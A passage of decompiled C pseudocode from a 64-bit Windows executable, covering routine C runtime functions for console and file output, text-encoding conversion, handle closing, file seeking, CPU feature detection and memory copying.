  if ( (unsigned __int64)v49 < v10 )
  {
    v14 = v6 >> 6;
    v55 = v6 >> 6;
    v15 = 0;
    while ( 1 )
    {
      LOBYTE(v41[0]) = *v5;
      v42 = 0;
      v16 = 1;
      if ( v13 == 65001 )
      {
        v17 = 0;
        v18 = 0;
        v19 = (_BYTE *)(qword_1400278D0[v14] + 8 * v9 + 62);
        do
        {
          if ( *v19 == 0 )
            break;
          ++v17;
          ++v18;
          ++v19;
        }
        while ( v18 < 5 );
        if ( v18 <= 0 )
        {
          v26 = byte_140026F30[(unsigned __int8)*v5];
          v27 = v44 - (_QWORD)v5;
          if ( (int)v26 + 1 > (__int64)(v44 - (_QWORD)v5) )
          {
            if ( v27 > 0 )
            {
              v38 = 0;
              v39 = v50;
              do
              {
                *(_BYTE *)(v38 + 8 * v9 + qword_1400278D0[v39] + 62) = v5[v38];
                ++v11;
                ++v38;
              }
              while ( v11 < v27 );
            }
            *(_DWORD *)(a1 + 4) += v27;
            return a1;
          }
          v46 = 0;
          v53 = v5;
          v28 = ((_DWORD)v26 == 3) + 1;
          if ( sub_1400209C8(&v42, &v53, v28, &v46, v12) == -1 )
            return a1;
          v5 += v26;
          v16 = v28;
          v8 = v50;
        }
        else
        {
          v20 = byte_140026F30[*(unsigned __int8 *)(qword_1400278D0[v8] + 8 * v9 + 62)] + 1;
          LODWORD(v46) = v20 - v17;
          v21 = v44 - (_QWORD)v5;
          v22 = v20 - v17;
          if ( v22 > (__int64)(v44 - (_QWORD)v5) )
          {
            if ( v21 > 0 )
            {
              v37 = &v5[-v18];
              do
              {
                *(_BYTE *)(v18 + 8 * v9 + qword_1400278D0[v8] + 62) = v37[v18];
                ++v11;
                ++v18;
              }
              while ( v11 < v21 );
            }
            *(_DWORD *)(a1 + 4) += v21;
            return a1;
          }
          v23 = 0;
          v24 = (_BYTE *)(qword_1400278D0[v14] + 8 * v9 + 62);
          do
            v57[v23++] = *v24++;
          while ( v23 < v18 );
          if ( v22 > 0 )
          {
            sub_140022A10(&v57[v18], v5, v22);
            v12 = v45;
          }
          for ( i = 0; i < v18; ++i )
            *(_BYTE *)(i + 8 * v9 + qword_1400278D0[v8] + 62) = 0;
          v51 = 0;
          v52 = v57;
          v16 = (v20 == 4) + 1;
          if ( sub_1400209C8(&v42, &v52, v16, &v51, v12) == -1 )
            return a1;
          v5 += (int)v46 - 1;
        }
      }
      else
      {
        v29 = qword_1400278D0[v8];
        v30 = *(_BYTE *)(v29 + 8 * v9 + 61);
        if ( (v30 & 4) != 0 )
        {
          v58[0] = *(_BYTE *)(v29 + 8 * v9 + 62);
          v58[1] = *v5;
          *(_BYTE *)(v29 + 8 * v9 + 61) = v30 & 0xFB;
          v31 = 2;
          v32 = v58;
          goto LABEL_29;
        }
        v33 = (unsigned __int8)*v5;
        if ( *(__int16 *)(**(_QWORD **)(v12 + 24) + 2 * v33) >= 0 )
        {
          v31 = 1;
          v32 = v5;
LABEL_29:
          if ( (unsigned int)sub_140020610((WCHAR *)&v42, v32, v31, v12) == -1 )
            return a1;
          goto LABEL_30;
        }
        if ( (unsigned __int64)(v5 + 1) >= v44 )
        {
          *(_BYTE *)(v29 + 8 * v9 + 62) = v33;
          *(_BYTE *)(qword_1400278D0[v8] + 8 * v9 + 61) |= 4u;
          *(_DWORD *)(a1 + 4) = v15 + 1;
          return a1;
        }
        if ( (unsigned int)sub_140020610((WCHAR *)&v42, v5, 2u, v12) == -1 )
          return a1;
        ++v5;
      }
LABEL_30:
      ++v5;
      v34 = sub_14001DA38(ConsoleOutputCP, 0, (const WCHAR *)&v42, v16, Buffer, 5, nullptr, nullptr);
      v35 = v34;
      if ( v34 == 0 )
        return a1;
      NumberOfBytesWritten = 0;
      v36 = hFile;
      if ( !WriteFile(hFile, Buffer, v34, &NumberOfBytesWritten, nullptr) )
      {
LABEL_48:
        *(_DWORD *)a1 = GetLastError();
        return a1;
      }
      v15 = (_DWORD)v5 + *(_DWORD *)(a1 + 8) - (_DWORD)v49;
      *(_DWORD *)(a1 + 4) = v15;
      if ( NumberOfBytesWritten < v35 )
        return a1;
      if ( LOBYTE(v41[0]) == 10 )
      {
        v41[0] = 13;
        if ( !WriteFile(v36, v41, 1u, &NumberOfBytesWritten, nullptr) )
          goto LABEL_48;
        if ( NumberOfBytesWritten == 0 )
          return a1;
        ++*(_DWORD *)(a1 + 8);
        v15 = ++*(_DWORD *)(a1 + 4);
      }
      if ( (unsigned __int64)v5 >= v44 )
        return a1;
      v12 = v45;
      v14 = v55;
      v13 = v48;
    }
  }
  return a1;
}


// ----- sub_140021AF0 @ 0x140021af0 -----
__int64 __fastcall sub_140021AF0(__int64 a1, int a2, char *a3, int a4)
{
  unsigned __int64 v5; // rbp
  char *v6; // rsi
  void *v7; // r14
  char *v8; // rbx
  char v9; // al
  DWORD v10; // ebx
  DWORD v11; // eax
  DWORD NumberOfBytesWritten; // [rsp+30h] [rbp-1438h] BYREF
  _BYTE Buffer[5119]; // [rsp+40h] [rbp-1428h] BYREF
  char v15; // [rsp+143Fh] [rbp-29h] BYREF

  v5 = (unsigned __int64)&a3[a4];
  v6 = a3;
  v7 = *(void **)(qword_1400278D0[(__int64)a2 >> 6] + 72LL * (a2 & 0x3F) + 40);
  *(_QWORD *)a1 = 0;
  *(_DWORD *)(a1 + 8) = 0;
  if ( (unsigned __int64)a3 < v5 )
  {
    while ( 1 )
    {
      v8 = Buffer;
      do
      {
        if ( (unsigned __int64)v6 >= v5 )
          break;
        v9 = *v6++;
        if ( v9 == 10 )
        {
          ++*(_DWORD *)(a1 + 8);
          *v8++ = 13;
        }
        *v8++ = v9;
      }
      while ( v8 < &v15 );
      NumberOfBytesWritten = 0;
      v10 = (_DWORD)v8 - (unsigned int)Buffer;
      if ( !WriteFile(v7, Buffer, v10, &NumberOfBytesWritten, nullptr) )
        break;
      v11 = NumberOfBytesWritten;
      *(_DWORD *)(a1 + 4) += NumberOfBytesWritten;
      if ( v11 < v10 || (unsigned __int64)v6 >= v5 )
        return a1;
    }
    *(_DWORD *)a1 = GetLastError();
  }
  return a1;
}


// ----- sub_140021BF8 @ 0x140021bf8 -----
__int64 __fastcall sub_140021BF8(__int64 a1, int a2, __int16 *a3, unsigned int a4)
{
  unsigned __int64 v5; // rbp
  __int16 *v6; // rsi
  void *v7; // r14
  char *v8; // rbx
  __int16 v9; // ax
  DWORD v10; // ebx
  DWORD v11; // eax
  DWORD NumberOfBytesWritten; // [rsp+30h] [rbp-1438h] BYREF
  _BYTE Buffer[5118]; // [rsp+40h] [rbp-1428h] BYREF
  __int16 v15; // [rsp+143Eh] [rbp-2Ah] BYREF

  v5 = (unsigned __int64)a3 + a4;
  v6 = a3;
  v7 = *(void **)(qword_1400278D0[(__int64)a2 >> 6] + 72LL * (a2 & 0x3F) + 40);
  *(_QWORD *)a1 = 0;
  *(_DWORD *)(a1 + 8) = 0;
  if ( (unsigned __int64)a3 < v5 )
  {
    while ( 1 )
    {
      v8 = Buffer;
      do
      {
        if ( (unsigned __int64)v6 >= v5 )
          break;
        v9 = *v6++;
        if ( v9 == 10 )
        {
          *(_DWORD *)(a1 + 8) += 2;
          *(_WORD *)v8 = 13;
          v8 += 2;
        }
        *(_WORD *)v8 = v9;
        v8 += 2;
      }
      while ( v8 < (char *)&v15 );
      NumberOfBytesWritten = 0;
      v10 = 2 * ((v8 - Buffer) >> 1);
      if ( !WriteFile(v7, Buffer, v10, &NumberOfBytesWritten, nullptr) )
        break;
      v11 = NumberOfBytesWritten;
      *(_DWORD *)(a1 + 4) += NumberOfBytesWritten;
      if ( v11 < v10 || (unsigned __int64)v6 >= v5 )
        return a1;
    }
    *(_DWORD *)a1 = GetLastError();
  }
  return a1;
}


// ----- sub_140021D14 @ 0x140021d14 -----
__int64 __fastcall sub_140021D14(__int64 a1, int a2, WCHAR *a3, unsigned int a4)
{
  unsigned __int64 v5; // r14
  int v6; // r15d
  WCHAR *v7; // rdi
  void *v8; // r12
  WCHAR *v9; // r9
  WCHAR v10; // ax
  unsigned int v11; // ebp
  unsigned int v12; // esi
  DWORD NumberOfBytesWritten; // [rsp+40h] [rbp-1458h] BYREF
  WCHAR v15[852]; // [rsp+50h] [rbp-1448h] BYREF
  char v16; // [rsp+6F8h] [rbp-DA0h] BYREF
  struct _OVERLAPPED Overlapped; // [rsp+700h] [rbp-D98h] BYREF

  v5 = (unsigned __int64)a3 + a4;
  v6 = (int)a3;
  v7 = a3;
  v8 = *(void **)(qword_1400278D0[(__int64)a2 >> 6] + 72LL * (a2 & 0x3F) + 40);
  *(_QWORD *)a1 = 0;
  *(_DWORD *)(a1 + 8) = 0;
  if ( (unsigned __int64)a3 < v5 )
  {
LABEL_2:
    v9 = v15;
    do
    {
      if ( (unsigned __int64)v7 >= v5 )
        break;
      v10 = *v7++;
      if ( v10 == 10 )
        *v9++ = 13;
      *v9++ = v10;
    }
    while ( v9 < (WCHAR *)&v16 );
    v11 = sub_14001DA38(0xFDE9u, 0, v15, v9 - v15, (CHAR *)&Overlapped, 3413, nullptr, nullptr);
    if ( v11 != 0 )
    {
      v12 = 0;
      while ( 1 )
      {
        NumberOfBytesWritten = 0;
        if ( !WriteFile(v8, (char *)&Overlapped + v12, v11 - v12, &NumberOfBytesWritten, nullptr) )
          break;
        v12 += NumberOfBytesWritten;
        if ( v12 >= v11 )
        {
          *(_DWORD *)(a1 + 4) = (_DWORD)v7 - v6;
          if ( (unsigned __int64)v7 < v5 )
            goto LABEL_2;
          return a1;
        }
      }
    }
    *(_DWORD *)a1 = GetLastError();
  }
  return a1;
}


// ----- sub_140021E88 @ 0x140021e88 -----
__int64 __fastcall sub_140021E88(int a1, __int64 a2, unsigned int a3, __int64 a4)
{
  BOOL v8; // eax
  __int64 v9; // r15
  unsigned int v10; // r14d

  if ( a1 == -2 )
  {
    *(_BYTE *)(a4 + 56) = 1;
    *(_DWORD *)(a4 + 52) = 0;
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 9;
    return 0xFFFFFFFFLL;
  }
  v8 = a1 >= 0 && a1 < (unsigned int)dword_140027CD0;
  if ( !v8 || (v9 = (__int64)a1 >> 6, (*(_BYTE *)(qword_1400278D0[v9] + 72LL * (a1 & 0x3F) + 56) & 1) == 0) )
  {
    *(_BYTE *)(a4 + 56) = 1;
    *(_DWORD *)(a4 + 52) = 0;
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 9;
    sub_14001A6B8(0, 0, 0, 0, 0, a4);
    return 0xFFFFFFFFLL;
  }
  sub_1400211F8(a1);
  v10 = -1;
  if ( (*(_BYTE *)(qword_1400278D0[v9] + 72LL * (a1 & 0x3F) + 56) & 1) != 0 )
  {
    v10 = sub_140021FA8((unsigned int)a1, a2, a3, a4);
  }
  else
  {
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 9;
    *(_BYTE *)(a4 + 56) = 1;
    *(_DWORD *)(a4 + 52) = 0;
  }
  sub_140021220(a1);
  return v10;
}


// ----- sub_140021FA8 @ 0x140021fa8 -----
__int64 __fastcall sub_140021FA8(int a1, char *a2, unsigned int a3, __int64 a4)
{
  int v4; // edi
  __int64 v5; // r14
  __int64 v6; // r13
  __int64 v10; // rax
  __int64 v11; // r12
  __int64 v12; // r15
  __int64 v13; // rcx
  char *v14; // r12
  char *v15; // r15
  DWORD v16; // r14d
  __int64 v17; // rax
  __int64 v18; // xmm0_8
  __int64 v19; // rdx
  void *v20; // rcx
  char v21; // [rsp+30h] [rbp-38h]
  __int16 v22; // [rsp+30h] [rbp-38h]
  DWORD NumberOfBytesWritten[2]; // [rsp+38h] [rbp-30h] BYREF
  int v24; // [rsp+40h] [rbp-28h]
  __int64 v25; // [rsp+48h] [rbp-20h]
  DWORD Mode[4]; // [rsp+58h] [rbp-10h] BYREF

  v4 = 0;
  v5 = a3;
  v6 = a1;
  if ( a3 == 0 )
    return 0;
  if ( a2 == nullptr
    || (v10 = a1 & 0x3F,
        v11 = (__int64)a1 >> 6,
        v12 = 9 * v10,
        v13 = qword_1400278D0[v11],
        (unsigned __int8)((v21 = *(_BYTE *)(v13 + 72 * v10 + 57)) - 1) <= 1u)
    && (a3 & 1) != 0 )
  {
    *(_BYTE *)(a4 + 56) = 1;
    *(_DWORD *)(a4 + 52) = 0;
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 22;
    sub_14001A6B8(0, 0, 0, 0, 0, a4);
    return 0xFFFFFFFFLL;
  }
  if ( (*(_BYTE *)(v13 + 72 * v10 + 56) & 0x20) != 0 )
    sub_140022388((unsigned int)v6, 0, 2);
  v25 = 0;
  if ( (unsigned int)sub_140021198(v6) != 0 && *(char *)(qword_1400278D0[v11] + 8 * v12 + 56) < 0 )
  {
    if ( *(_BYTE *)(a4 + 40) == 0 )
      sub_14001D7A0(a4);
    if ( *(_QWORD *)(*(_QWORD *)(a4 + 24) + 312LL) != 0 || *(_BYTE *)(qword_1400278D0[v11] + 8 * v12 + 57) != 0 )
    {
      Mode[0] = 0;
      if ( GetConsoleMode(*(HANDLE *)(qword_1400278D0[v11] + 8 * v12 + 40), Mode) )
      {
        if ( v21 == 0 )
        {
          v17 = sub_14002165C((__int64)NumberOfBytesWritten, v6, a2, v5, a4);
          goto LABEL_28;
        }
        if ( (unsigned int)(v21 - 1) <= 1 )
        {
          v14 = &a2[v5];
          *(_QWORD *)NumberOfBytesWritten = 0;
          v15 = a2;
          if ( a2 < &a2[v5] )
          {
            v16 = NumberOfBytesWritten[1];
            while ( 1 )
            {
              v22 = *(_WORD *)v15;
              if ( (unsigned __int16)sub_14002267C(*(unsigned __int16 *)v15) != v22 )
                break;
              v16 += 2;
              NumberOfBytesWritten[1] = v16;
              if ( v22 == 10 )
              {
                if ( (unsigned __int16)sub_14002267C(13) != 13 )
                  break;
                NumberOfBytesWritten[1] = ++v16;
                ++v4;
              }
              v15 += 2;
              if ( v15 >= v14 )
                goto LABEL_39;
            }
            NumberOfBytesWritten[0] = GetLastError();
          }
          goto LABEL_39;
        }
LABEL_41:
        if ( HIDWORD(v25) != 0 )
          return (unsigned int)(HIDWORD(v25) - v4);
        if ( (_DWORD)v25 != 0 )
        {
          if ( (_DWORD)v25 == 5 )
          {
            *(_BYTE *)(a4 + 48) = 1;
            *(_DWORD *)(a4 + 44) = 9;
            *(_BYTE *)(a4 + 56) = 1;
            *(_DWORD *)(a4 + 52) = 5;
          }
          else
          {
            sub_14001A8A8(v25, a4);
          }
          return 0xFFFFFFFFLL;
        }
        if ( (*(_BYTE *)(qword_1400278D0[v6 >> 6] + 72 * (v6 & 0x3F) + 56) & 0x40) == 0 || *a2 != 26 )
        {
          *(_DWORD *)(a4 + 52) = 0;
          *(_BYTE *)(a4 + 48) = 1;
          *(_DWORD *)(a4 + 44) = 28;
          *(_BYTE *)(a4 + 56) = 1;
          return 0xFFFFFFFFLL;
        }
        return 0;
      }
    }
  }
  v19 = qword_1400278D0[v6 >> 6];
  if ( *(char *)(v19 + 72 * (v6 & 0x3F) + 56) >= 0 )
  {
    v20 = *(void **)(v19 + 72 * (v6 & 0x3F) + 40);
    *(_QWORD *)NumberOfBytesWritten = 0;
    v24 = 0;
    if ( !WriteFile(v20, a2, v5, &NumberOfBytesWritten[1], nullptr) )
      NumberOfBytesWritten[0] = GetLastError();
    v4 = v24;
LABEL_39:
    v18 = *(_QWORD *)NumberOfBytesWritten;
    goto LABEL_40;
  }
  if ( v21 != 0 )
  {
    if ( v21 == 1 )
    {
      v17 = sub_140021D14((__int64)NumberOfBytesWritten, v6, (WCHAR *)a2, v5);
    }
    else
    {
      if ( v21 != 2 )
        goto LABEL_41;
      v17 = sub_140021BF8((__int64)NumberOfBytesWritten, v6, (__int16 *)a2, v5);
    }
  }
  else
  {
    v17 = sub_140021AF0((__int64)NumberOfBytesWritten, v6, a2, v5);
  }
LABEL_28:
  v18 = *(_QWORD *)v17;
  v4 = *(_DWORD *)(v17 + 8);
LABEL_40:
  v25 = v18;
  goto LABEL_41;
}


// ----- sub_1400222D8 @ 0x1400222d8 -----
LARGE_INTEGER __fastcall sub_1400222D8(int a1, LARGE_INTEGER a2, DWORD a3, __int64 a4)
{
  __int64 v4; // rdi
  void *v8; // rax
  LARGE_INTEGER result; // rax
  DWORD LastError; // eax
  LARGE_INTEGER NewFilePointer; // [rsp+20h] [rbp-18h] BYREF

  v4 = a1;
  v8 = (void *)sub_140021304(a1);
  if ( v8 == (void *)-1LL )
  {
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 9;
    return (LARGE_INTEGER)-1LL;
  }
  NewFilePointer.QuadPart = 0;
  if ( !SetFilePointerEx(v8, a2, &NewFilePointer, a3) )
  {
    LastError = GetLastError();
    sub_14001A8A8(LastError, a4);
    return (LARGE_INTEGER)-1LL;
  }
  result = NewFilePointer;
  if ( NewFilePointer.QuadPart == -1 )
    return (LARGE_INTEGER)-1LL;
  *(_BYTE *)(qword_1400278D0[v4 >> 6] + 72 * (v4 & 0x3F) + 56) &= ~2u;
  return result;
}


// ----- sub_140022388 @ 0x140022388 -----
// attributes: thunk
LARGE_INTEGER __fastcall sub_140022388(int a1, LARGE_INTEGER a2, DWORD a3, __int64 a4)
{
  return sub_1400222D8(a1, a2, a3, a4);
}


// ----- sub_140022390 @ 0x140022390 -----
__int64 sub_140022390()
{
  return (unsigned int)dword_140027CD4;
}


// ----- sub_1400223A0 @ 0x1400223a0 -----
__int64 sub_1400223A0()
{
  int v0; // r8d
  __int64 result; // rax

  v0 = 0;
  _RAX = 1;
  dword_140027CDC = 0;
  __asm { cpuid }
  if ( (_RCX & 0x18001000) == 0x18001000 )
  {
    __asm { xgetbv }
    if ( (_RAX & 6) == 6 )
    {
      v0 = 1;
      dword_140027CDC = 1;
    }
    else
    {
      v0 = dword_140027CDC;
    }
  }
  result = 0;
  if ( (v0 & 1) != 0 )
  {
    __asm { cpuid }
    if ( (int)_RAX < 7 )
    {
      result = 0;
    }
    else
    {
      _RAX = 7;
      __asm { cpuid }
      result = 0;
      if ( (_RBX & 0x20) != 0 )
      {
        dword_140027CDC = 3;
        dword_140027CD8 = 3;
        return result;
      }
    }
  }
  dword_140027CD8 = v0;
  return result;
}


// ----- sub_140022454 @ 0x140022454 -----
__int64 __fastcall sub_140022454(__int64 a1, int *a2, int **a3, int *a4)
{
  int *v6; // rdx
  unsigned int v7; // ebx

  sub_1400211F8(*a2);
  v6 = a3[1];
  if ( (*(_BYTE *)(qword_1400278D0[(__int64)**a3 >> 6] + 72LL * (**a3 & 0x3F) + 56) & 1) != 0 )
  {
    v7 = sub_140022590(**a3, v6);
  }
  else
  {
    *((_BYTE *)v6 + 48) = 1;
    v6[11] = 9;
    v7 = -1;
  }
  sub_140021220(*a4);
  return v7;
}


// ----- sub_1400224CC @ 0x1400224cc -----
__int64 __fastcall sub_1400224CC(int a1, __int64 a2)
{
  int v3; // [rsp+30h] [rbp-28h] BYREF
  int *v4[4]; // [rsp+38h] [rbp-20h] BYREF
  int v5; // [rsp+60h] [rbp+8h] BYREF
  char v6; // [rsp+70h] [rbp+18h] BYREF
  int v7; // [rsp+78h] [rbp+20h] BYREF

  v5 = a1;
  if ( a1 == -2 )
  {
    *(_BYTE *)(a2 + 56) = 1;
    *(_DWORD *)(a2 + 52) = 0;
    *(_BYTE *)(a2 + 48) = 1;
    *(_DWORD *)(a2 + 44) = 9;
  }
  else
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_140027CD0
      && (*(_BYTE *)(qword_1400278D0[(__int64)a1 >> 6] + 72LL * (a1 & 0x3F) + 56) & 1) != 0 )
    {
      v4[1] = (int *)a2;
      v7 = a1;
      v3 = a1;
      v4[0] = &v5;
      return sub_140022454((__int64)&v6, &v3, v4, &v7);
    }
    *(_BYTE *)(a2 + 56) = 1;
    *(_DWORD *)(a2 + 52) = 0;
    *(_BYTE *)(a2 + 48) = 1;
    *(_DWORD *)(a2 + 44) = 9;
    sub_14001A6B8(0, 0, 0, 0, 0, a2);
  }
  return 0xFFFFFFFFLL;
}


// ----- sub_140022590 @ 0x140022590 -----
__int64 __fastcall sub_140022590(int a1, __int64 a2)
{
  __int64 v2; // rdi
  DWORD LastError; // ebx
  __int64 v5; // rbx
  void *v6; // rax

  v2 = a1;
  if ( sub_140021304(a1) == -1
    || ((_DWORD)v2 == 1 && (*(_BYTE *)(qword_1400278D0[0] + 200) & 1) != 0
     || (_DWORD)v2 == 2 && (*(_BYTE *)(qword_1400278D0[0] + 128) & 1) != 0)
    && (v5 = sub_140021304(2), sub_140021304(1) == v5)
    || (v6 = (void *)sub_140021304(v2), CloseHandle(v6)) )
  {
    LastError = 0;
  }
  else
  {
    LastError = GetLastError();
  }
  sub_140021248(v2);
  *(_BYTE *)(qword_1400278D0[v2 >> 6] + 72 * (v2 & 0x3F) + 56) = 0;
  if ( LastError == 0 )
    return 0;
  sub_14001A8A8(LastError, a2);
  return 0xFFFFFFFFLL;
}


// ----- sub_140022660 @ 0x140022660 -----
__int64 __fastcall sub_140022660(__int64 a1)
{
  *(_DWORD *)(a1 + 24) = -1;
  *(_QWORD *)a1 = 0;
  *(_QWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 16) = 0;
  *(_QWORD *)(a1 + 28) = 0;
  *(_QWORD *)(a1 + 40) = 0;
  return (unsigned int)_InterlockedExchange((volatile __int32 *)(a1 + 20), 0);
}


// ----- sub_14002267C @ 0x14002267c -----
__int64 __fastcall sub_14002267C(unsigned __int16 a1)
{
  unsigned __int16 Buffer; // [rsp+30h] [rbp+8h] BYREF
  DWORD NumberOfCharsWritten; // [rsp+38h] [rbp+10h] BYREF

  Buffer = a1;
  if ( (unsigned int)sub_1400226BC() != 0
    && (NumberOfCharsWritten = 0, (unsigned int)sub_14002272C(&Buffer, 1u, &NumberOfCharsWritten) != 0) )
  {
    return Buffer;
  }
  else
  {
    return 0xFFFF;
  }
}


// ----- sub_1400226BC @ 0x1400226bc -----
__int64 sub_1400226BC()
{
  char *FileW; // rax
  unsigned int v1; // ebx

  FileW = (char *)hObject;
  v1 = 0;
  if ( hObject == (HANDLE)-2LL )
  {
    FileW = (char *)CreateFileW(L"CONOUT$", 0x40000000u, 3u, nullptr, 3u, 0, nullptr);
    hObject = FileW;
  }
  LOBYTE(v1) = FileW + 1 != nullptr;
  return v1;
}


// ----- sub_140022710 @ 0x140022710 -----
BOOL sub_140022710()
{
  BOOL result; // eax

  if ( (unsigned __int64)hObject <= 0xFFFFFFFFFFFFFFFDuLL )
    return CloseHandle(hObject);
  return result;
}


// ----- sub_14002272C @ 0x14002272c -----
__int64 __fastcall sub_14002272C(void *lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten)
{
  unsigned int v6; // ebx

  v6 = WriteConsoleW(hObject, lpBuffer, nNumberOfCharsToWrite, lpNumberOfCharsWritten, nullptr);
  if ( v6 == 0 && GetLastError() == 6 )
  {
    if ( (unsigned __int64)hObject <= 0xFFFFFFFFFFFFFFFDuLL )
      CloseHandle(hObject);
    hObject = CreateFileW(L"CONOUT$", 0x40000000u, 3u, nullptr, 3u, 0, nullptr);
    return WriteConsoleW(hObject, lpBuffer, nNumberOfCharsToWrite, lpNumberOfCharsWritten, nullptr);
  }
  return v6;
}


// ----- sub_1400227F0 @ 0x1400227f0 -----
__int64 __fastcall sub_1400227F0(__int64 a1, unsigned __int64 a2)
{
  unsigned int v2; // r9d
  __int64 v3; // r8
  unsigned int v5; // r11d
  __int64 result; // rax
  unsigned __int64 v7; // rdx

  v2 = 0;
  v3 = a1 + *(int *)(a1 + 60);
  v5 = *(unsigned __int16 *)(v3 + 6);
  result = v3 + *(unsigned __int16 *)(v3 + 20) + 24LL;
  if ( (_WORD)v5 == 0 )
    return 0;
  while ( 1 )
  {
    v7 = *(unsigned int *)(result + 12);
    if ( a2 >= v7 && a2 < (unsigned int)(v7 + *(_DWORD *)(result + 8)) )
      break;
    ++v2;
    result += 40;
    if ( v2 >= v5 )
      return 0;
  }
  return result;
}


// ----- sub_140022840 @ 0x140022840 -----
__int64 __fastcall sub_140022840(__int64 a1)
{
  __int64 result; // rax

  result = sub_140022890(0x140000000uLL);
  if ( (_DWORD)result != 0 )
  {
    result = sub_1400227F0(0x140000000LL, a1 - 0x140000000LL);
    if ( result != 0 )
      return *(_DWORD *)(result + 36) >= 0;
  }
  return result;
}


// ----- sub_140022890 @ 0x140022890 -----
_BOOL8 __fastcall sub_140022890(__int64 a1)
{
  __int64 v1; // rdx

  return *(_WORD *)a1 == 23117 && *(_DWORD *)((v1 = *(int *)(a1 + 60)) + a1) == 17744 && *(_WORD *)(v1 + a1 + 24) == 523;
}


// ----- sub_1400228C0 @ 0x1400228c0 -----
_QWORD *__fastcall sub_1400228C0(_QWORD *a1, char a2)
{
  *a1 = &type_info::`vftable';
  if ( (a2 & 1) != 0 )
    sub_1400228F0(a1);
  return a1;
}


// ----- sub_1400228F0 @ 0x1400228f0 -----
// attributes: thunk
__int64 __fastcall sub_1400228F0(LPVOID lpMem)
{
  return sub_140022970(lpMem);
}


// ----- sub_140022900 @ 0x140022900 -----
__int64 __fastcall sub_140022900(__int64 a1, __int64 a2, int a3, __int64 a4)
{
  __int64 v4; // rbx

  v4 = *(_QWORD *)(a4 + 56);
  sub_14001DCE0(a2, a4, (_DWORD *)(v4 + 4));
  if ( ((((*(_BYTE *)(a1 + 4) & 0x66) != 0) + 1) & *(_DWORD *)(v4 + 4)) != 0 )
    return sub_14001E910(a1, a2, a3, a4);
  else
    return 1;
}


// ----- sub_140022970 @ 0x140022970 -----
// attributes: thunk
void __fastcall sub_140022970(LPVOID lpMem)
{
  sub_140020570(lpMem);
}


// ----- j__guard_dispatch_icall_nop @ 0x140022990 -----
// attributes: thunk
__int64 __fastcall j__guard_dispatch_icall_nop()
{
  __int64 (__fastcall *v0)(); // rax

  return v0();
}


// ----- _guard_dispatch_icall_nop @ 0x1400229b0 -----
__int64 __fastcall guard_dispatch_icall_nop()
{
  __int64 (*v0)(void); // rax

  return v0();
}


// ----- _guard_xfg_dispatch_icall_nop @ 0x1400229d0 -----
// attributes: thunk
__int64 __fastcall guard_xfg_dispatch_icall_nop()
{
  __int64 (*v0)(void); // rax

  return v0();
}


// ----- sub_140022A00 @ 0x140022a00 -----
void __fastcall sub_140022A00(void *a1, const void *a2, unsigned __int64 a3)
{
  qmemcpy(a1, a2, a3);
}


// ----- sub_140022A10 @ 0x140022a10 -----
void __fastcall sub_140022A10(__m128i *_RCX, const __m128i *_RDX, unsigned __int64 _R8)
{
  __int32 v4; // ecx
  __int16 v5; // r9
  __int8 v6; // r10
  __int16 v7; // cx
  __int8 v8; // r9
  __int16 v9; // r8
  __int8 v10; // r9
  __int32 v11; // ecx
  __int16 v12; // r9
  __int8 v13; // r8
  __int32 v14; // ecx
  __int8 v15; // r9
  __int16 v16; // cx
  __int8 v17; // cl
  __int32 v18; // ecx
  __int16 v19; // r8
  __int8 v20; // r8
  __m128i v21; // xmm2
  __m128i *v22; // r9
  const __m128i *v23; // r9
  __int64 v26; // r9
  __m128i v59; // xmm0
  __m128i v60; // xmm5
  __int64 v61; // r9
  __m128i v62; // xmm2
  __m128i v63; // xmm3
  __m128i v64; // xmm4
  __m128i v65; // xmm2
  __m128i v66; // xmm3
  __m128i v67; // xmm4
  unsigned __int64 v68; // r9
  __m128i v69; // xmm2
  signed __int64 v70; // rdx
  __int8 *v71; // rcx
  __int128 v72; // xmm0
  unsigned __int64 v73; // rcx
  unsigned __int64 v74; // r8
  _OWORD *v75; // r9
  __int128 v76; // xmm1
  unsigned __int64 v77; // r9
  __int128 v78; // xmm0
  __int128 v79; // xmm1
  __int128 v80; // xmm1
  __int128 v81; // xmm1
  __int128 v82; // xmm0
  __int128 v83; // xmm1
  unsigned __int64 i; // r9

  _RAX = _RCX;
  switch ( _R8 )
  {
    case 0uLL:
      return;
    case 1uLL:
      _RCX->m128i_i8[0] = _RDX->m128i_i8[0];
      return;
    case 2uLL:
      _RCX->m128i_i16[0] = _RDX->m128i_i16[0];
      return;
    case 3uLL:
      v13 = _RDX->m128i_i8[2];
      _RCX->m128i_i16[0] = _RDX->m128i_i16[0];
      _RCX->m128i_i8[2] = v13;
      return;
    case 4uLL:
      _RCX->m128i_i32[0] = _RDX->m128i_i32[0];
      return;
    case 5uLL:
      v20 = _RDX->m128i_i8[4];
      _RCX->m128i_i32[0] = _RDX->m128i_i32[0];
      _RCX->m128i_i8[4] = v20;
      return;
    case 6uLL:
      v19 = _RDX->m128i_i16[2];
      _RCX->m128i_i32[0] = _RDX->m128i_i32[0];
      _RCX->m128i_i16[2] = v19;
      return;
    case 7uLL:
      v9 = _RDX->m128i_i16[2];
      v10 = _RDX->m128i_i8[6];
      _RCX->m128i_i32[0] = _RDX->m128i_i32[0];
      _RCX->m128i_i16[2] = v9;
      _RCX->m128i_i8[6] = v10;
      return;
    case 8uLL:
      _RCX->m128i_i64[0] = _RDX->m128i_i64[0];
      return;
    case 9uLL:
      v17 = _RDX->m128i_i8[8];
      _RAX->m128i_i64[0] = _RDX->m128i_i64[0];
      _RAX->m128i_i8[8] = v17;
      return;
    case 0xAuLL:
      v16 = _RDX->m128i_i16[4];
      _RAX->m128i_i64[0] = _RDX->m128i_i64[0];
      _RAX->m128i_i16[4] = v16;
      return;
    case 0xBuLL:
      v7 = _RDX->m128i_i16[4];
      v8 = _RDX->m128i_i8[10];
      _RAX->m128i_i64[0] = _RDX->m128i_i64[0];
      _RAX->m128i_i16[4] = v7;
      _RAX->m128i_i8[10] = v8;
      return;
    case 0xCuLL:
      v18 = _RDX->m128i_i32[2];
